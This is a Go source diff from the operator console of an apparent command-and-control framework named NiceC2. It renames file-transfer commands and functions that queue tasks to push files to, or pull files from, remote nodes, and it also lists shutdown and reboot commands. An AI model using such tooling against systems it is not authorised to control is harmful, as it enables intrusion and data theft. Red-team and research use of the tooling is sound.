@@ -66,8 +66,8 @@ func main() {
 			fmt.Println("shutdown <node>\t\t\t\t\t\t- Shutdown device")
 			fmt.Println("reboot <node>\t\t\t\t\t\t- Reboot device")
 			fmt.Println("Exit\t\t\t\t\t\t\t- Exit the NiceC2 interface")
-			fmt.Println("get-file <node> -f <file> -d <destination path>\t\t- Download file to the client.")
-			fmt.Println("send-file <node> <filepath>\t\t- get-file file from the client.")
+			fmt.Println("send-file <node> -f <file> -d <destination path>\t\t- Download file to the client.")
+			fmt.Println("get-file <node> <filepath>\t\t- get-file file from the client.")
 
 		}
 		if strings.Compare("exit", text) == 0 {
@@ -110,7 +110,7 @@ func main() {
 
 			processed_text := text[10:]
 
-			node, file, path, err := parse_download(processed_text)
+			node, file, path, err := parse_send_file(processed_text)
 
 			if err != nil {
 				fmt.Println(err)
@@ -119,7 +119,7 @@ func main() {
 
 			fmt.Println("Downloading file " + file + " to " + path + " on " + node)
 
-			download(node, file, path)
+			send_file(node, file, path)
 
 		}
 
@@ -160,7 +160,7 @@ func get_file(node string, path string) {
 	get_task_by_id(task_id)
 }
 
-func parse_download(input string) (string, string, string, error) {
+func parse_send_file(input string) (string, string, string, error) {
 
 	// Split by -f first
 	parts1 := strings.Split(input, " -f ")
@@ -180,13 +180,13 @@ func parse_download(input string) (string, string, string, error) {
 
 }
 
-func download(node string, file string, path string) {
+func send_file(node string, file string, path string) {
 
 	// Combining the data
 	data := file + " || " + path
 
-	task_id := create_task_by_ID(node, "download", data, "2")
-	fmt.Println("Download Task created (" + task_id + ")")
+	task_id := create_task_by_ID(node, "send-file", data, "2")
+	fmt.Println("send-file Task created (" + task_id + ")")
 	time.Sleep(5 * time.Second) // Time is added to wait for command to get to / be run on node
 	get_task_by_id(task_id)
 
